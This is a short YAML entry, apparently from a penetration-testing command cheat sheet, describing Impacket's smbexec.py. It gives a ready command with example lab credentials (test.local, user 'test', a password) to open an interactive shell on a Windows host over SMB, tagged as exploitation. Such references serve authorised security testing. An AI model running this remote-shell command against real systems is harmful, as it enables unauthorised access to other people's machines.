---
title: |
  
description: |
  Impacket's smbexec.py. This will give you an interactive shell on the Windows host.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: test

  	Password: Welkom01!
command: |
  python3 smbexec.py test.local/test:Welkom01!@10.10.10.1
items:
  - Password
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
  - https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/
---
